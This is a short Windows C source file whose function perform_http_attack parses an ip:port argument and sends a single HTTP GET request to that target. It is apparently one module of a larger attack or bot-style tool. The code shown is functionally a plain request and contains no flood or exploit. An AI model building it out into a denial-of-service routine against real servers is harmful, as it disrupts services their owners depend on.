
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include "http_attack.h"

#pragma comment(lib, "ws2_32.lib")

void perform_http_attack(const char* ip_port) {
    char ip[64];
    int port;


    if (sscanf(ip_port, "%63[^:]:%d", ip, &port) != 2) {
        printf("[-] Invalid argument for http_attack (expected format ip:port)\n");
        return;
    }

    WSADATA wsaData;
    WSAStartup(MAKEWORD(2, 2), &wsaData);
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in target;
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    target.sin_addr.s_addr = inet_addr(ip);

    if (connect(sock, (struct sockaddr*)&target, sizeof(target)) == 0) {
        const char* http_get = "GET / HTTP/1.1\r\nHost: localhost\r\nConnection: close\r\n\r\n";
        send(sock, http_get, strlen(http_get), 0);
        printf("[+] HTTP GET sent to %s:%d\n", ip, port);
    } else {
        printf("[-] Failed to connect to %s:%d\n", ip, port);
    }

    closesocket(sock);
    WSACleanup();
}
